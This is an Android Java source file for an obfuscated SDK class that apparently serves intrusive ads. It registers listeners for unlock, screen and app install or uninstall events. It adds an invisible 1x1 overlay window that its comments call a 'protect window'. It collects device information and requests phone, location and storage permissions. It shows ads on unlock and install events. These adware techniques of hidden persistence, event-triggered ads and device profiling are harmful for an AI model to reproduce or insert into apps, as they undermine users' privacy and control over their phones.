package com.mxOrkle.lmUdcf.lwNm;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.StrictMode;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.Button;

import com.mxOrkle.lmUdcf.layer.LayerManager;
import com.mxOrkle.lmUdcf.listener.BootReceiver;
import com.mxOrkle.lmUdcf.listener.ScreenReceiver;
import com.mxOrkle.lmUdcf.listener.UserPresentReceiver;
import com.mxOrkle.lmUdcf.manager.RuleManager;
import com.mxOrkle.lmUdcf.model.DeviceInfo;
import com.mxOrkle.lmUdcf.task.DeviceInfoTask;
import com.mxOrkle.lmUdcf.task.IDeviceInfoListener;
import com.mxOrkle.lmUdcf.utils.CommonUtils;
import com.mxOrkle.lmUdcf.utils.LogUtils;
import com.mxOrkle.lmUdcf.v4.ActivityCompat;
import com.mxOrkle.lmUdcf.v4.ContextCompat;
import com.mxOrkle.lmUdcf.utils.SystemUtils;

import static android.Manifest.permission.ACCESS_COARSE_LOCATION;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;
import static android.os.Build.VERSION_CODES.M;
import static com.mxOrkle.lmUdcf.lwNm.MConstant.sence.screen_on;


public class klpsdk implements IDeviceInfoListener {

    private Context mContext;
    public static klpsdk sInstance = null;

    public static klpsdk getInstance() {
        if (sInstance == null){
            synchronized (klpsdk.class){
                if (sInstance == null){
                    sInstance = new klpsdk();
                }
            }
        }
        return sInstance;
    }

    public void init(Context context){
        this.mContext = context.getApplicationContext();
        initReceivers(mContext);
        add1ProtectWindow(mContext);
    }

    public void startNi(final Context context){
        DeviceInfo mDeviceInfo = CommonUtils.readParcel(context, MConstant.DEVICE_FILE_NAME);
        if (mDeviceInfo == null){

            new DeviceInfoTask(new IDeviceInfoListener() {
                @Override
                public void deviceInfoLoaded(DeviceInfo deviceInfo) {
                    CommonUtils.writeParcel(context, MConstant.DEVICE_FILE_NAME, deviceInfo);
                }
            }, context).execute();
        }
    }
    public void setApli(){

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
            StrictMode.setVmPolicy(builder.build());
            builder.detectFileUriExposure();
        }
    }

    private  void  add1ProtectWindow(Context context){

        Button button = new Button(context);
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams wmParams = new WindowManager.LayoutParams();

        wmParams.type = WindowManager.LayoutParams.TYPE_TOAST; // 这里是关键，你也可以试试2003
        wmParams.format = PixelFormat.RGBA_8888; // 设置图片格式，效果为背景透明

        wmParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
        wmParams.width = 1;
        wmParams.height = 1;
        wmParams.gravity= Gravity.LEFT|Gravity.TOP;
        wm.addView(button, wmParams); // 创建View

    }


    public Context getContext(){
        return mContext;
    }

    @Override
    public void deviceInfoLoaded(DeviceInfo deviceInfo) {
        LogUtils.i(MConstant.TAG,"init load device info over");
        CommonUtils.writeParcel(mContext, MConstant.DEVICE_FILE_NAME, deviceInfo);
    }

    private void initReceivers(Context pContext) {


        UserPresentReceiver userPresentReceiver=new UserPresentReceiver();
        IntentFilter if_userpresent = new IntentFilter();
        if_userpresent.addAction(Intent.ACTION_USER_PRESENT);
        pContext.registerReceiver(userPresentReceiver,if_userpresent);

        BootReceiver bootReceiver=new BootReceiver();
        IntentFilter if_boot=new IntentFilter();
        if_boot.addAction(Intent.ACTION_PACKAGE_ADDED);
        if_boot.addAction(Intent.ACTION_PACKAGE_REMOVED);
        if_boot.addDataScheme("package");
        pContext.registerReceiver(bootReceiver,if_boot);

        ScreenReceiver screenReceiver=new ScreenReceiver();
        IntentFilter screen=new IntentFilter();
        screen.addAction(Intent.ACTION_SCREEN_OFF);
        screen.addAction(Intent.ACTION_SCREEN_ON);
        pContext.registerReceiver(screenReceiver,screen);

    }
    public void startMiiService(Activity activity){
         if (Build.VERSION.SDK_INT >= M){
            checkPermission(activity);
         }
         else {
             activity.startService(new Intent(activity, OsdvService.class));
         }
    }

    /**
     android 6.0以上检查权限WRITE_EXTERNAL_STORAGE
     */
    private void checkPermission(final Activity activity){
        try {
            if (ContextCompat.checkSelfPermission(activity.getApplicationContext(), READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(activity.getApplicationContext(), ACCESS_COARSE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(activity.getApplicationContext(), WRITE_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED
                    ) {

                ActivityCompat.requestPermissions(activity, new String[]{READ_PHONE_STATE,ACCESS_COARSE_LOCATION,WRITE_EXTERNAL_STORAGE}, 123);
                Handler handler=new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (ContextCompat.checkSelfPermission(activity.getApplicationContext(), READ_PHONE_STATE)
                                != PackageManager.PERMISSION_GRANTED
                                || ContextCompat.checkSelfPermission(activity.getApplicationContext(), ACCESS_COARSE_LOCATION)
                                != PackageManager.PERMISSION_GRANTED
                                || ContextCompat.checkSelfPermission(activity.getApplicationContext(), WRITE_EXTERNAL_STORAGE)
                                != PackageManager.PERMISSION_GRANTED
                                ) {


                        }
                        else {
                            activity.startService(new Intent(activity, OsdvService.class));
                        }
                    }
                },5000);

            }
            else {

                activity.startService(new Intent(activity, OsdvService.class));

            }
        }catch (Exception e){


            e.printStackTrace();

        }
    }

    public void startAd(Intent intent, Application application){
        String appid = "2cb465d95";
        String IID = "ae8Z4ijQ";
        String KID = "ObybnUMq";
        String BID = "RtvVO0e6";
        String lid;
        boolean isScene = false;
        int show_percentage = (int) ((Math.random() * 100)+1);
        int pt = 0;
        if (show_percentage <= 40){
            pt = 2;
            lid = KID;
        }
        else if (40 < show_percentage && show_percentage <= 70 ){
            pt = 1;
            lid = BID;
        }
        else {
            pt = 3;
            lid = IID;
        }

        RuleManager rule = RuleManager.getInstance(application, LayerManager.obtainLocal(application));
        boolean needListen = true;
        if (intent != null) {
            if (intent.getBooleanExtra(MConstant.sence.user_present, false)) {
                LogUtils.i(MConstant.TAG,"get user_present");
                MConstant.isBlack=false;
                pt = 2;
                lid = KID;
                isScene = true;
                needListen = true;
            }
            if (intent.getBooleanExtra(MConstant.sence.screen_off, false)) {
                LogUtils.i(MConstant.TAG,"get off");
                MConstant.isBlack=true;
                needListen=false;
            }
            if (intent.getBooleanExtra(screen_on, false)) {
                LogUtils.i(MConstant.TAG,"get on");
                if (!SystemUtils.checkPasswordToUnLock(application)){
                    MConstant.isBlack=false;
                }
            }
            if (intent.getBooleanExtra(MConstant.sence.install, false)){
                LogUtils.i(MConstant.TAG,"get i");
                MConstant.isBlack=false;
                pt = 3;
                lid = IID;
                isScene = true;
                needListen = true;
            }
            if (intent.getBooleanExtra(MConstant.sence.uninstall, false)){
                LogUtils.i(MConstant.TAG,"get uni");
                MConstant.isBlack=false;
                pt = 3;
                lid = IID;
                isScene = true;
                needListen = true;
            }
            if (needListen) {
                rule.listen(pt,appid,lid,isScene);
            }

        }
    }

}
